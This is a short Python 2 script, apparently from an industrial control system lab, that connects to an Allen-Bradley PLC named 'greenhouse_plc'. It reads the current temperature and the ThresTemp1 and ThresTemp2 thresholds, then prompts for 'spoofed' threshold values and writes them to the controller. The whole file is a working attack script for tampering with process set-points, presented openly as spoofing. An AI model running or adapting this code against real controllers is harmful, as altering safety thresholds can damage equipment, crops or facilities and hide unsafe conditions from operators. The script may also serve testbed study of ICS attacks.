#!/usr/bin/env python2
import time
from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IPS = {
    'greenhouse_plc': '192.168.1.151',
}

def spoof_temperature():
    plc = ClxDriver()
    if plc.open(PLC_IPS['greenhouse_plc']):
        # Read current Temp1
        temp1_val = plc.read_tag('Temp1')
        if temp1_val[0] is not None:
            print("Current Temp1 value: {:.2f}".format(temp1_val[0]))
        else:
            print("Failed to read Temp1")
            plc.close()
            return

        # Read current thresholds
        thres1 = plc.read_tag('ThresTemp1')[0]
        thres2 = plc.read_tag('ThresTemp2')[0]

        print("Current thresholds: ThresTemp1 = {:.2f}, ThresTemp2 = {:.2f}".format(thres1, thres2))

        # Ask user for spoofed Temp value
        try:
            print("Temp is OUTSIDE thresholds.")
            spoof_thres1 = float(raw_input("Enter spoofed Thres1 value to write: "))
            spoof_thres2 = float(raw_input("Enter spoofed Thres2 value to write: "))
            print(plc.write_tag('ThresTemp1', spoof_thres1, 'REAL')) 
            print(plc.write_tag('ThresTemp2', spoof_thres2, 'REAL')) 
            print("Spoofed ThresTemp written:", spoof_thres1, " , ", spoof_thres2)
            
        except ValueError:
            print("Invalid input. Must be a number.")

        plc.close()
    else:
        print("Unable to connect to PLC")

if __name__ == '__main__':
    spoof_temperature()
